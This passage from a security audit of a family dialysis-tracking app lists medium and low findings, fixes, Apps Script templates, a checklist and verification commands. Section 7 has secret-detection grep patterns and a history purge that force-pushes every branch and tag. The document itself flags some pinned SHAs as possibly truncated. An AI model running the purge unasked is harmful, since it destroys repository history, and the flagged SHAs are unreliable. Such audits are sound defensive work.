          echo "OK: No hardcoded secrets detected"
```

---

### 2.3 Medium

---

**M1 — CI `deploy.yml` Uses Single-Quoted JS String Injection**

> 💬 **What this means:** Your CI pipeline builds a config file by dropping your secret values directly into a template, wrapped in single quotes. If the secret ever contains a single-quote character (unlikely in a GAS URL, but possible), it would break the JavaScript syntax — like a sentence that contains an apostrophe inside a quoted string ending the quote early. Similarly, the `printf` command used to write the file treats `%` as a special formatting character — a secret containing `%s` would be interpreted as "insert a string here" rather than as literal text. The fix keeps secrets in separate variables where they can't interfere with the surrounding syntax.

- **File:** `.github/workflows/deploy.yml` lines 26–27
- **Current:** `window.APPS_SCRIPT_URL = '${{ secrets.APPS_SCRIPT_URL }}';`
- **Impact:** A single quote in a secret value produces invalid JavaScript. `printf '%s'` is also unsafe if the secret contains `%` (treated as printf format specifiers).

**Fix:** Use `cat` with a shell here-string and double-quoted JS strings:

```yaml
- name: Write config.js from secrets
  env:
    SCRIPT_URL: ${{ secrets.APPS_SCRIPT_URL }}
    SCRIPT_TOKEN: ${{ secrets.APPS_SCRIPT_TOKEN }}
  run: |
    cat > js/config.js << ENDOFCONFIG
    window.APPS_SCRIPT_URL   = "${SCRIPT_URL}";
    window.APPS_SCRIPT_TOKEN = "${SCRIPT_TOKEN}";
    ENDOFCONFIG
```

> This places the secret values into environment variables first (avoiding direct `${{ }}` shell injection), then uses double-quoted JS strings. Works correctly with secrets containing single quotes, spaces, and other special characters except `"` and `\` — which are not valid in GAS URLs or UUID tokens.

---

**M2 — GAS Deployment Mode Unknown (HEAD vs Versioned)**

> 💬 **What this means:** Google Apps Script has two types of deployment URLs. A versioned deployment (`/exec`) runs the specific version you deliberately published — like a released app. The test URL (`/dev`) always runs whatever is currently saved in the editor, even half-finished changes. If your live app is using the `/dev` URL, any edit you make to `Code.gs` and save — even accidentally — goes live instantly, for all users, with no review. It also means incomplete security fixes could go live piecemeal. Always use a versioned deployment for anything real users depend on.

- **Action:** Verify in GAS console (Deploy → Manage deployments) that the URL used in `APPS_SCRIPT_URL` GitHub Secret is a versioned deployment (`/exec`), not the test URL (`/dev`). The test URL always runs the latest saved code — any unsaved change to Code.gs goes live immediately.
- **Fix:** If using `/dev`, create a new versioned deployment and update the GitHub Secret.

---

**M3 — Old GAS Deployment URLs Not Confirmed Deleted**

> 💬 **What this means:** Every time you create a new GAS deployment, the old URL doesn't automatically stop working. It stays live indefinitely. If you've ever rotated your URL (e.g., after a security concern) and the old URL was distributed anywhere — shared with a family member, stored in an old browser — it still works and still reaches the old version of your code, which may have had security issues. It's like changing your front door lock but never invalidating the hundred copies of the old key you handed out. GAS's "archive" button is the only way to kill old URLs.

- **Action:** In GAS → Deploy → Manage deployments, verify only the current deployment is active. Archive all others. Old deployments remain accessible indefinitely until explicitly archived, and any previously distributed URL continues to work.

---

**M4 — `validateToken` Is a Public GET with No Rate Limit**

> 💬 **What this means:** When the app starts, it checks if its saved token is still valid by calling `validateToken` publicly — no login required. This is by design. But without any limit, an attacker can hammer this endpoint thousands of times per minute. They won't get useful data without a valid token, but they can still drain your daily request quota and make the app unavailable. Covered by the H2 fix which adds light rate limiting to all public endpoints.

- **File:** `apps-script/Code.gs` — `doGet`
- **Impact:** `validateToken` returns the token's status, theme, language, and textSize preferences. While it requires knowing a valid token to get useful data, it can be called at unlimited rate to probe for valid tokens or exhaust quota.
- **Fix:** Addressed in the updated `doGet` template (H2) with `isRateLimited('pub_vtok')`.

---

**M5 — `getPatients` Returns All Patients to Any Valid Token**

> 💬 **What this means:** Any logged-in device — including caregiver/readonly devices — gets the full list of all patients: names, dates of birth, and IDs. In a single-family app this is completely intentional — everyone in the family should see everyone. This item is here just to flag it as a conscious design choice, so if you ever add a caregiver from outside the family, you remember to revisit whether they should see all patients or just the one they're caring for.

- **Context:** `getPatients` returns names, DOBs, and patient IDs for all patients to any approved/readonly token. In single-family use this is by design. If caregivers or partial-access tokens are used, this is an over-disclosure.
- **Action:** Document as an intentional design decision, or scope `getPatients` to return only the patient matching the token's `ActivePatientID`.

---

**M7 — Unpinned GitHub Actions (Supply Chain Risk)**

> 💬 **What this means:** When your CI pipeline runs, it uses tools from third parties — things like `actions/checkout@v4` to check out your code, and `gitleaks` to scan for secrets. The `@v4` is a tag, like a label saying "use version 4." But the people who own that tool can re-point that label to completely different code at any time. If the tool maintainer's account were ever hacked, an attacker could update `@v4` to run malicious code — and your pipeline would execute it on the next push, with access to your `APPS_SCRIPT_URL` and `APPS_SCRIPT_TOKEN` secrets. Pinning to a specific commit SHA (a long unique fingerprint) means "use exactly this version, forever, no matter what" — like saving a recipe by photograph instead of just bookmarking a page that can change.

- **Found in:** Review Pass 15 (supply chain expert).
- **Files:** `.github/workflows/deploy.yml`, `.github/workflows/security-scan.yml` (proposed)
- **Current:** `actions/checkout@v4`, `actions/upload-pages-artifact@v3`, `actions/deploy-pages@v4`, `gitleaks/gitleaks-action@v2` — all pinned to mutable tags, not SHA hashes.
- **Impact:** A tag like `@v4` can be reassigned by the action maintainer (or an attacker who compromises the maintainer's account) to point to different code. Your CI pipeline runs that new code with write access to your repository and GitHub Pages. A poisoned `actions/checkout@v4` could exfiltrate `APPS_SCRIPT_URL` and `APPS_SCRIPT_TOKEN` secrets.
- **Fix:** Pin each action to its current commit SHA:
  ```yaml
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: actions/upload-pages-artifact@56afc609e74202658d3b67b3dde1e1f4dc37a48  # v3.0.1
  - uses: actions/deploy-pages@d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e  # v4.0.5
  - uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070a  # v2.3.2
  ```

  > ⚠️ **Verify SHA length before use:** SHA-1 hashes are exactly 40 hex characters. Two of the example SHAs above (`upload-pages-artifact`, `gitleaks-action`) may be 39 characters — verify at the source before using. Always look up current SHAs at `github.com/[owner]/[repo]/tags`, click the tag, and copy the full 40-character "tree SHA" or commit SHA shown at the top. Do not use shortened SHAs for supply-chain pinning — an abbreviated SHA is valid but ambiguous and undermines the security guarantee.
  >
  > To verify a SHA length locally: `echo -n "56afc609e74202658d3b67b3dde1e1f4dc37a48" | wc -c` should return 40.

---

**M8 — No Token Revocation API (Lost/Stolen Device)**

> 💬 **What this means:** Imagine a family caregiver's phone is stolen. The thief has the app open, with the device token stored in the browser. They can see all measurements and health data. To stop them, you need to mark that token as revoked. Currently, the only way to do that is to open the Google Sheet, find the right row in the Tokens tab, and manually change its status. If you're not comfortable with spreadsheets — or if you're in a hospital and just need to block access quickly — this is a real barrier. The code already supports a "revoked" status; there's just no button in the app to set it. Adding a simple "revoke device by name" feature would let you block a stolen device from your own phone in seconds.

- **Found in:** Review Pass 17 (incident responder).
- **Impact:** If a device is lost or stolen, the owner must manually find the token row in the Google Sheet, locate it by label, and change its Status column to `revoked`. There is no in-app mechanism. For a medical app with sensitive patient data, this is an operational gap — a caregiver may not know how to access the spreadsheet.
- **Recommendation:** Add an owner-only `revokeToken` POST action that accepts a `label` + `passwordHash` and sets the matching token's status to `revoked`. This lets the owner revoke access from another device (e.g., their own phone) without needing spreadsheet access. Document the manual procedure as a fallback.

---

**M9 — Password Hash IS the Authentication Credential**

> 💬 **What this means:** Normal password security works like this: you type a password, the server runs it through a scrambling function (hash + salt), and stores only the scrambled result. When you log in, it scrambles what you typed and checks if it matches — the original password is never stored and never sent over the network. Your app does something slightly different: the app scrambles the password *on your device* before sending it, and the server stores and compares that scramble. The problem is that the scrambled value itself becomes the password — if someone reads your Tokens spreadsheet and sees the scrambled value in column 6, they can just send that exact value in a login request without ever knowing your original password. Your Google account security is the last line of defense here: if 2FA is enabled and your Google account is secure, the spreadsheet is private and this is hard to exploit. If 2FA is off, it's a real risk.

- **Found in:** Review Pass 14 (cryptographer).
- **Impact:** The client computes `passwordHash = hash(password)` and sends it to the server. The server stores it and compares directly: `String(rows[i][5]) === String(passwordHash)`. The stored hash IS the credential — anyone who reads the Tokens sheet column 6 can authenticate as any device, bypassing the password entirely. There is no server-side salt; the hash is also potentially vulnerable to rainbow table attacks if a common password was used.
- **Context / Risk level:** The Tokens sheet is owned by and accessible only to the Google account running the script (the patient's account). This is protected by Google account authentication (2FA). The practical risk is: (a) if 2FA is not enabled on the Google account, or (b) if the sheet is accidentally shared with wrong permissions. The risk is **real but bounded** by Google account security.
- **Mitigation options:**
  1. **Near-term:** Enable 2FA on the Google account that owns the spreadsheet. Document this as a required step in setup instructions.
  2. **Long-term architectural:** Move to server-side PBKDF2/bcrypt: client sends plaintext password over HTTPS → server hashes with a per-device salt → only the salted hash is stored. This requires changing the login flow significantly.

---

**M10 — Per-Minute Rate Limit Does Not Protect Daily GAS Quota**

> 💬 **What this means:** The rate limit says "no more than 30 requests per minute." That sounds reasonable — but do the math: 30 per minute × 60 minutes × 24 hours = 43,200 requests per day. Your entire free daily GAS allowance is 20,000. So a single device following the rate limit rules perfectly could still exhaust the whole day's quota in 27 minutes, taking the app down for everyone. The per-minute limit stops a sudden burst attack, but not a slow, sustained one. Adding a separate per-day limit (e.g., 2,000 requests per token per day) fixes this — normal use is well under 100 requests/day, so only abuse would hit the ceiling.

- **Found in:** Review Pass 16 (rate limiting mathematician).
- **Impact:** The rate limit of 30 requests per 60-second window translates to a theoretical maximum of 43,200 requests/day per token. The GAS free tier allows 20,000 requests/day across all executions. A single token at the rate limit ceiling exhausts the daily quota in ~28 minutes, taking the app down for all users for the rest of the day.
- **Context:** The per-minute limit protects against burst attacks (e.g., 10,000 requests in 10 seconds) but not against sustained moderate-rate abuse. For a legitimate family app, normal usage is well under 100 requests/day per token, so this is unlikely to be hit accidentally. It is a theoretical abuse vector for a determined attacker with a valid token.
- **Recommendation:** Add a separate per-day counter (using a 86400-second CacheService entry), capped at 2,000 requests/token/day.

  > ✅ **Already implemented in Section 5.** The `isRateLimited` function in Section 5 integrates the per-day counter with the correct check-before-increment order (both limits checked first, both counters incremented atomically in a single `else` branch). Do not implement from a separate inline snippet — use Section 5 as the single authoritative implementation. Item 16 in Section 3.2 confirms no separate deployment step is needed.

---

**M11 — Remediation Step Ordering: `doPost` Listed Before `isRateLimited`**

> 💬 **What this means:** This is a sequencing bug in the plan itself. The new `doPost` function calls `isRateLimited` — it depends on that function existing first. If a developer followed the plan steps in order (fix doPost, then add isRateLimited), the first deploy would crash every write request with "isRateLimited is not defined." The app would be broken for writes until the second change was also deployed. The fix is simple: deploy both changes in a single update. The plan now says this explicitly.

- **Found in:** Review Pass 20 (maintainer perspective).
- **Impact:** Section 3.1 lists the remediation items in this order: item 2 (fix `doPost` with canonical template) then item 3 (add `isRateLimited`). The canonical `doPost` template CALLS `isRateLimited`. If a developer applies the items in listed order — deploying the new `doPost` before adding `isRateLimited` — every POST request will throw `ReferenceError: isRateLimited is not defined` and return `{ error: 'Internal error' }`. The app is down for writes until `isRateLimited` is also deployed.
- **Fix:** In Section 3.1, list item 3 (add `isRateLimited`) BEFORE item 2 (new `doPost`). Both changes should be deployed as a single GAS version update. See updated remediation plan below.

> ✅ **Already applied.** Section 3.1 now lists `isRateLimited` as item 2 and `doPost` as item 3 — the correct deployment order. The deploy-order warning note at the top of Section 3.1 also makes this explicit.

---

**M6 — `measurementType` Not Validated Against Whitelist**

> 💬 **What this means:** When the app logs a measurement, it includes a type — "drain", "fill", "blood pressure", etc. The dashboard uses these type values to filter and display data: "show me only drain measurements," "calculate exchange volumes," and so on. Currently, the server accepts any string for this field without checking. After the formula-injection fix, a bad value won't cause a security breach — but it corrupts the data. A record saved with `measurementType = "anything"` becomes invisible to all dashboard queries, like a file saved with a made-up extension that no app can open. A whitelist check — "must be one of these 5 known values" — costs one line of code and keeps the data clean.

- **File:** `apps-script/Code.gs` — `logMeasurement`
- **Impact:** `data.measurementType` is written directly to the sheet without checking it's one of the expected values (`drain`, `fill`, `drain_fill`, `weight`, `bp`). An attacker can write arbitrary short strings. After sanitisation (C1) this won't cause formula injection, but it corrupts the data model used by dashboard queries.
- **Fix:**
  ```javascript
  var VALID_MEAS_TYPES = ['drain', 'fill', 'drain_fill', 'weight', 'bp'];
  var measType = String(data.measurementType || '');
  if (VALID_MEAS_TYPES.indexOf(measType) === -1) {
    return { error: 'Invalid measurement type' }; // return, do NOT throw — see C4 UX regression note
  }
  ```

> ⚠️ **C4 UX regression:** Do NOT use `throw new Error('Invalid measurement type')` here. After applying the C4 error-handler fix, any `throw` inside `logMeasurement` is caught by `doPost`'s outer catch and returned as `{ error: 'Internal error' }` — the validation message never reaches the client. Use `return { error: 'Invalid measurement type' }` so the doPost dispatch (`return jsonResponse(logMeasurement(body))`) passes the error directly to the caller. This is the same pattern required for `loginOrRegister` (see C4). Apply the same `return { error: ... }` pattern to any other input validation in write handlers.

---

### 2.4 Low

---

**L1 — doGet Returns `Unknown GET action` Including the Action Name**

> 💬 **What this means:** When someone calls an action that doesn't exist, the error echoes back the name they tried: "Unknown GET action: getSecretData." This is helpful for debugging, but tells an attacker exactly which action names are invalid — helping them probe for valid ones by elimination. The fix is trivial: return "Unknown action" without echoing anything back.

- **File:** `apps-script/Code.gs` line 49
- **Current:** `return jsonResponse({ error: 'Unknown GET action: ' + action });`
- **Impact:** Minor information disclosure — confirms to callers which action names are invalid. Should return a generic message.
- **Fix:** `return jsonResponse({ error: 'Unknown action' });`

---

**L2 — No Audit Logging for Failed Auth Attempts**

> 💬 **What this means:** Currently, failed login attempts happen silently — no trace anywhere. If someone is repeatedly trying to guess device credentials, you have no way of knowing. An audit log would be a simple spreadsheet tab that records "wrong password attempt at 3am from this label" — like a security camera at the front door. You don't need it today, but if you ever suspect something is wrong, you'd wish it existed.

- Consider writing failed `loginOrRegister` attempts (wrong password, rate-limited) to a separate audit log sheet. Useful for detecting brute-force attempts against the password hash.

---

**L3 — Rate Limit Window Is Sliding, Not Fixed**

> 💬 **What this means:** The rate limit says "no more than 30 requests in any 60-second window." But the window resets with every request. So if someone makes 29 requests, waits 61 seconds, makes 29 more, waits 61 seconds — they can do this forever without ever triggering the limit. A "fixed window" would draw strict lines (minute 0:00–1:00, 1:00–2:00, etc.) and count within each. The sliding window is easier to implement with Google's tools and is an accepted trade-off for a family app — noted here so future maintainers understand why it behaves this way.

- `cache.put(key, count, 60)` resets the TTL on every write. The 60-second window extends with each request. A caller making 29 requests every 61 seconds can sustain indefinitely without triggering the limit. Accepted trade-off for this app's threat model; document in a code comment.

---

**L4 — CacheService Eviction as Undocumented Fail-Open Path**

> 💬 **What this means:** The rate limit counter is stored in Google's CacheService — a temporary memory space with a total size limit of 100 KB. If many different things are being stored there simultaneously and the space fills up, old entries get silently deleted. If a token's rate-limit counter gets deleted mid-attack, it resets to zero — and the attacker gets a "fresh start" without triggering any alarm. This is extremely unlikely in a single-family app (you'd need dozens of active tokens hitting the limits simultaneously), but it's documented here so future developers understand the mechanism's limits and don't assume rate limiting is rock-solid under all conditions.

- **Found in:** Review Pass 19 (infrastructure expert).
- `CacheService.getScriptCache()` has a 100 KB total size limit. If the cache is full and a rate-limit counter is evicted, `cache.get(key)` returns `null`, the counter resets to 0, and the rate limit is bypassed. The current plan comment says "fails open if lock cannot be acquired" — but cache eviction is a second, undocumented fail-open path. For a family app with one active token this is extremely unlikely, but it should be documented in the code comment (done in the updated Section 5 above).

---

**L5 — Clickjacking Not Fully Mitigated**

> 💬 **What this means:** "Clickjacking" is an attack where a bad site loads your app invisibly inside a frame, then overlays its own fake buttons on top. When you think you're tapping "cancel," you're actually tapping a hidden button in your real app — maybe submitting a measurement, or changing a setting. The normal defence is an HTTP header saying "this page cannot be embedded in frames." But GitHub Pages can't set custom HTTP headers, and the CSP `frame-ancestors` rule (which does the same thing) is silently ignored when you deliver it the only way GitHub Pages allows. The practical risk for a medical tracker is low — clickjacking is mainly used against banking or shopping — but a JavaScript one-liner at the top of the page ("if I'm inside a frame, escape") provides a basic defence that works on GitHub Pages.

- **Found in:** Review Pass 20 (browser security expert).
- The plan adds CSP with `frame-ancestors 'none'` in a `<meta>` tag. Per the CSP spec, `frame-ancestors` is **silently ignored** when delivered via `<meta>` — it only works via HTTP response headers. GitHub Pages cannot set custom HTTP headers. `X-Frame-Options` has the same constraint.
- **Impact:** The app can be embedded in an `<iframe>` on a third-party site. This enables clickjacking: overlay invisible buttons on top of the real UI to trick a logged-in user into performing actions (e.g., submitting a measurement). Practical risk is low for a medical tracker — clickjacking typically targets e-commerce or auth flows.
- **Mitigation:** Add JavaScript frame-busting as the only viable option on GitHub Pages:
  ```html
  <!-- In index.html <head>, before any other scripts -->
  <script>
    if (window.self !== window.top) {
      // App is inside an iframe — navigate the top frame to us
      window.top.location = window.self.location;
    }
  </script>
  ```
  Note: frame-busting JS can be defeated by a sandboxed iframe (`sandbox` attribute without `allow-top-navigation`). This is an accepted limitation of the GitHub Pages hosting model.

---

**L6 — `touchToken` and `validateToken` Accept Unbounded Input Before Sheet Scan**

> 💬 **What this means:** These functions receive a token from the caller and scan the entire Tokens sheet looking for a match. A real token is 36 characters. But currently, nothing stops a caller from sending a 1,000,000-character string as the "token" — the code will diligently compare that enormous string against every row in the sheet before giving up. With rate limiting in place this can't cause real damage, but adding a quick "reject anything over 100 characters" check at the top costs nothing and makes the code obviously correct.

- **Found in:** Review Pass 18 (QA edge cases).
- **File:** `apps-script/Code.gs` — `touchToken` (line 508), `validateToken` (line 443)
- Both functions accept the `token` parameter directly from caller without checking its length before performing a full sheet scan. A caller sending a 100,000-character string causes `String(rows[i][0]) === String(veryLongString)` for every token row. This is a minor CPU/quota concern, fully mitigated by rate limiting (H2). Still, defensive input validation is cheap.
- **Fix:** Add a length guard at the start of both functions:
  ```javascript
  function validateToken(token) {
    if (!token || String(token).length > 100) return { status: 'unknown' };
    // ... rest of function
  }
  function touchToken(token) {
    if (!token || String(token).length > 100) return { success: false };
    // ... rest of function
  }
  ```

---

## 3. Remediation Plan

### 3.1 Immediate (Critical — Fix Before Next Production Change)

> **Deploy order matters:** Items 1–3 must be deployed as a single GAS version update. The new `doPost` (item 3) calls `isRateLimited` (item 2) — deploying them separately will crash all POST requests until both are live.

| # | Fix | Files |
|---|---|---|
| 1 | Add `sanitiseForSheet()` + apply to all sheet writes | `Code.gs` |
| 2 | Add `isRateLimited()` function — use C7-fixed version from Section 5 | `Code.gs` |
| 3 | Fix `doPost`: null guard, body size limit, canonical dispatch (Section 4) | `Code.gs` |
| 4 | Fix `doGet` and `doPost` error handlers (no raw message echo) — all 3 catch sites; convert `loginOrRegister` input validation from `throw` to `return { error: ... }` | `Code.gs` |
| 5 | Fix `validateToken` + `loginOrRegister` column range: 9 → 10 | `Code.gs` |
| 6 | Fix `editPatient` error — remove patientId from message | `Code.gs` |
| 7 | Add input length guard to `validateToken` + `touchToken` (L6) | `Code.gs` |

### 3.2 Short-term (This Sprint)

| # | Fix | Files |
|---|---|---|
| 8  | Add document locks to all sheet write operations (H1) | `Code.gs` |
| 9  | Add rate limiting to `doGet` (H2) | `Code.gs` |
| 10 | Add CSP `<meta>` to `index.html` — use C6-fixed version with `script.googleusercontent.com` | `index.html` |
| 11 | Add JS frame-busting snippet to `index.html` (L5) | `index.html` |
| 12 | Create `.github/workflows/security-scan.yml` with SHA-pinned actions (M7) | new file |
| 13 | Fix `deploy.yml` secret injection (M1) + pin action SHAs (M7) | `deploy.yml` |
| 14 | Add `measurementType` whitelist validation (M6) | `Code.gs` |
| 15 | Fix `doGet` unknown action message (L1) | `Code.gs` |
| 16 | Per-day rate limit is already included in the Section 5 `isRateLimited` implementation — no separate step needed | `Code.gs` |

### 3.3 Owner Actions (GAS Console — No Code Changes)

| # | Action |
|---|---|
| O1 | Confirm production deployment is versioned (`/exec`), not HEAD (`/dev`) |
| O2 | Archive/delete all inactive GAS deployments |
| O3 | Confirm GAS settings: Execute as **Me** / Who has access **Anyone** (anonymous) |
| O4 | Enable 2FA on the Google account that owns the spreadsheet (see M9) |

### 3.4 Design Decisions (Document Before Implementing)

| # | Decision |
|---|---|
| D1 | BOLA — implement `_getTokenPatientId` check or document that all tokens access all patients. Applies to both **reads** (`getDashboard`, `getHistory`) and **writes** (`logMeasurement`, `updateInventory`, `editPatient`). Decide scope before implementing H3. |
| D2 | `savePreferences` — the canonical `doPost` template allows readonly tokens to save preferences (theme/language/size). Confirm this is intentional or add `checkToken(body.token, false)` before `savePreferences`. |
| D3 | `getPatients` scope — all patients vs. per-token patient |
| D4 | Long-term CSP — schedule Option B refactor (addEventListener) to remove `'unsafe-inline'` |
| D5 | Token revocation — add in-app `revokeToken` action (M8) or document manual spreadsheet procedure |

---

## 4. Canonical `doPost` Template

Replace the entire `doPost` function in `Code.gs` with:

```javascript
function doPost(e) {
  // 1. Body size ceiling — reject oversized payloads before any processing
  var raw = (e.postData && e.postData.contents) || '{}';
  if (raw.length > 20000) return jsonResponse({ error: 'Request too large' });

  // 2. Parse JSON
  var body = {};
  try { body = JSON.parse(raw); } catch (_) {
    return jsonResponse({ error: 'Invalid request' });
  }

  var action = body.action || '';

  try {
    // 3. Public action — rate-limited even without a token
    if (action === 'loginOrRegister') {
      if (isRateLimited('pub_reg')) return jsonResponse({ error: 'Rate limit exceeded' });
      // loginOrRegister must return { error: ... } for validation failures, not throw —
      // throwing here would be caught below and return 'Internal error' to the client.
      // See C4 for the loginOrRegister fix.
      return jsonResponse(loginOrRegister(body.label, body.passwordHash, body.token));
    }

    // 4. Auth gate — accepts approved AND readonly tokens
    //    Write actions below re-check with (false) to reject readonly tokens.
    checkToken(body.token, true);

    // 5. Per-token rate limit
    //    slice(-8): last 8 chars of UUID = ~32 bits of entropy; keeps cache keys short.
    //    NOTE: doGet uses the same key format — GET and POST requests share one counter per
    //    token. 30 rapid GET refreshes and 30 POST writes together hit the limit at 30, not
    //    60. For a family app (<<30 req/min normal use) this is fine. If stricter separation
    //    is needed, suffix the key: slice(-8) + '_p' for POST, + '_g' for GET.
    if (isRateLimited(String(body.token).slice(-8))) {
      return jsonResponse({ error: 'Rate limit exceeded' });
    }

    // 6. Dispatch — write actions reject readonly tokens via second checkToken call
    if (action === 'logMeasurement') {
      checkToken(body.token, false);
      return jsonResponse(logMeasurement(body));
    }
    if (action === 'updateInventory') {
      checkToken(body.token, false);
      return jsonResponse(updateInventory(body));
    }
    if (action === 'addPatient') {
      checkToken(body.token, false);
      return jsonResponse(addPatient(body));
    }
    if (action === 'editPatient') {
      checkToken(body.token, false);
      return jsonResponse(editPatient(body));
    }
    if (action === 'savePreferences') {
      // Note: this allows readonly tokens to update their own display preferences
      // (theme, language, text size). If readonly tokens should not call this,
      // add: checkToken(body.token, false);
      return jsonResponse(savePreferences(body));
    }

    return jsonResponse({ error: 'Unknown action' });

  } catch (err) {
    // Only echo the known-safe auth string; all other errors → generic
    var msg = err.message === 'Unauthorized' ? 'Unauthorized' : 'Internal error';
    return jsonResponse({ error: msg });
  }
}
```

---

## 5. `isRateLimited` Implementation

Add to `Code.gs`:

```javascript
// Rate limit: max 30 requests per 60-second idle window (activity-based, not fixed).
// cache.put() resets the TTL on each write, so the counter expires after 60s of inactivity.
// Also enforces a per-day ceiling of 2,000 requests per token (see M10).
//
// Fails open (allows the request) if:
//   (a) The script lock cannot be acquired within 3 seconds (LockTimeoutException), OR
//   (b) CacheService evicts the counter entry (cache is full — 100 KB limit for script cache).
// Both are acceptable trade-offs: the alternative is crashing the caller.
//
// IMPORTANT: The acquired flag prevents releaseLock() from throwing if waitForLock() failed.
// Per GAS docs, releaseLock() on a lock you don't hold throws an exception. Calling it in
// finally{} without the guard would cause the function to throw instead of returning false.
function isRateLimited(tokenSuffix) {
  var key      = 'rl_'     + tokenSuffix;
  var dayKey   = 'rl_day_' + tokenSuffix;
  var cache    = CacheService.getScriptCache();
  var lock     = LockService.getScriptLock();
  var limited  = false;
  var acquired = false;
  try {
    lock.waitForLock(3000); // throws LockTimeoutException if busy > 3s
    acquired = true;

    // Check limits first, then increment — avoids wasting writes when already limited.
    var calls    = parseInt(cache.get(key)    || '0', 10); // explicit radix: Rhino safety
    var dayCalls = parseInt(cache.get(dayKey) || '0', 10);

    if (calls >= 30) {
      limited = true; // per-minute burst limit
    } else if (dayCalls >= 2000) {
      limited = true; // per-day quota protection (M10) — 2,000 req/token/day
                      // Protects the 20,000 req/day GAS free-tier limit across all tokens.
    } else {
      // Both checks passed — increment both counters atomically (under the same lock).
      cache.put(key,    String(calls    + 1), 60);    // 60s activity window
      cache.put(dayKey, String(dayCalls + 1), 86400); // 86400s activity window (sliding)
    }
  } catch (_) {
    limited = false; // fail open — do not crash the caller
  } finally {
    if (acquired) lock.releaseLock(); // only release if we actually acquired it
  }
  return limited;
}
```

---

## 6. Audit Checklist

| Area | Control | Severity | Status |
|---|---|---|---|
| GAS deployment | Execute as: Me / Who has access: Anyone (anonymous) | Critical | ⬜ Verify O3 |
| GAS handler | `sanitiseForSheet()` applied to all user-controlled strings before sheet writes | Critical | ✅ Done C1 |
| GAS handler | `sanitiseForSheet()` triggers only `= + - @` (not `\t` or `\r`) | Critical | ✅ Done C1 |
| GAS handler | Every doPost action routes through `checkToken()` before data work | Critical | ✅ Done C2 |
| GAS handler | `loginOrRegister` rate-limited with `isRateLimited('pub_reg')` | Critical | ✅ Done C3 |
| GAS handler | `e.postData` null-guarded before `.contents` access | Critical | ✅ Done C2 |
| GAS handler | Body size capped before `JSON.parse` (20KB) | Critical | ✅ Done C2 |
| GAS handler | Error responses: only 'Unauthorized' or 'Internal error' — no raw messages (all 3 catch sites) | Critical | ✅ Done C4 |
| GAS handler | `loginOrRegister` validation uses `return { error: ... }` not `throw` (avoids UX regression from C4) | Critical | ✅ Done C4 |
| GAS handler | `validateToken` + `loginOrRegister` read 10 columns (not 9) | Critical | ✅ Done C5 |
| GitHub Pages | CSP `connect-src` includes both `script.google.com` AND `script.googleusercontent.com` | Critical | ✅ Done C6 |
| GAS handler | `isRateLimited` uses `acquired` flag before `releaseLock()` in `finally` block | Critical | ✅ Done C7 |
| GAS handler | All document lock `finally` blocks use `acquired` flag (logMeasurement, updateInventory, addPatient, editPatient, loginOrRegister) | Critical | ✅ Done C1/H1 |
| GitHub repo | `js/config.js` in `.gitignore` | Critical | ✅ Done |
| GitHub repo | No Apps Script URL in committed JS/HTML | Critical | ✅ Done |
| GitHub repo | No auth tokens or API keys in committed source | Critical | ✅ Done |
| GAS handler | Sheet write ops wrapped in `LockService.getDocumentLock()` | High | ✅ Done H1 |
| GAS handler | `_touchDataLastUpdated()` always called inside a document lock | High | ✅ Done H1 |
| GAS handler | `doGet` protected endpoints rate-limited after `checkToken` | High | ✅ Done H2 |
| GAS handler | `validateToken` (public GET) has global rate limit | High | ✅ Done H2 |
| GAS handler | `touchToken` (public GET) has global rate limit | High | ✅ Done H2 |
| GAS handler | BOLA design decision documented and implemented | High | ✅ Accepted risk — single-family deployment, all tokens share access (D1) |
| GAS handler | `editPatient` error does not leak patientId | High | ✅ Done H4 |
| GitHub Pages | CSP `<meta>` present (at minimum with `'unsafe-inline'` — Option A) | High | ✅ Done H5 |
| GitHub Actions | Gitleaks + URL scan; weekly schedule | High | ✅ Done H6 |
| GAS deployment | Production uses versioned deployment (not HEAD/test URL) | Medium | ⬜ Verify O1 |
| GAS deployment | Old deployments archived after URL rotation | Medium | ⬜ Verify O2 |
| CI workflow | Secret injection uses double-quoted JS strings and env vars (not `printf`) | Medium | ✅ Done M1 |
| GitHub Actions | All action references pinned to commit SHA, not mutable tags | Medium | ✅ Done M7 |
| GAS handler | `measurementType` validated against whitelist using `return { error: ... }` not `throw` (avoids C4 UX regression) | Medium | ✅ Done M6 |
| GAS handler | Per-day rate limit (2,000 req/token/day) included in `isRateLimited` | Medium | ✅ Done M10 |
| Owner action | 2FA enabled on Google account that owns the spreadsheet | Medium | ⬜ Verify O4 |
| Git history | `git log --all -- "js/config.js"` returns no commits | Medium | ✅ Verified clean |
| Git history | `git log --all -- "apps-script/Config.defaults.gs"` returns no commits | Medium | ✅ Verified clean |
| GAS handler | `doGet` unknown action message does not echo action name | Low | ✅ Done L1 |
| GAS handler | `validateToken` + `touchToken` reject tokens longer than 100 chars | Low | ✅ Done L6 |
| GitHub Pages | JS frame-busting snippet present (`window.self !== window.top` guard) | Low | ✅ Done L5 |
| GAS handler | `revokeToken` POST action — owner can revoke device by label without spreadsheet access | Medium | ✅ Done M8 |
| GAS handler | Audit log (`AuditLog` sheet) — failed logins and revocations recorded | Low | ✅ Done L2 |

---

## 7. Verification Commands

Run from the PDManagement repo root after implementing all fixes:

```bash
# 1. Check no GAS URL in committed JS/HTML (H6, CI also checks this)
grep -rE "script\.google\.com/macros/s/[A-Za-z0-9_-]{20,}" \
  --include="*.js" --include="*.html" \
  --exclude="*.example" --exclude-dir=".git" .

# 2. Check no token patterns in committed source
grep -rE "(APPS_SCRIPT_TOKEN)\s*=\s*['\"][A-Za-z0-9_\-]{16,}" \
  --include="*.js" --include="*.html" \
  --exclude="*.example" --exclude-dir=".git" .

# 3. Check git history — was config.js ever committed?
git log --all --full-history -- "js/config.js"
git log --all --full-history -- "apps-script/Config.defaults.gs"
# If either returns commits, view the content to check for real secrets:
#   git show <COMMIT_HASH>:js/config.js
# If real secrets are found, rotate them immediately and then purge history:
#   pip install git-filter-repo
#   git filter-repo --path js/config.js --invert-paths
#   git push origin --force --all && git push origin --force --tags

# 4. Verify no sanitiseForSheet gap — confirm every appendRow/setValue call in Code.gs
#    uses sanitiseForSheet on all user-controlled string fields (C1):
grep -n "appendRow\|setValue" apps-script/Code.gs

# 5. Verify isRateLimited has the acquired flag (C7) — must NOT see bare releaseLock in finally:
grep -A5 "finally" apps-script/Code.gs
# Expect: "if (acquired) lock.releaseLock()" — NOT "lock.releaseLock()" alone

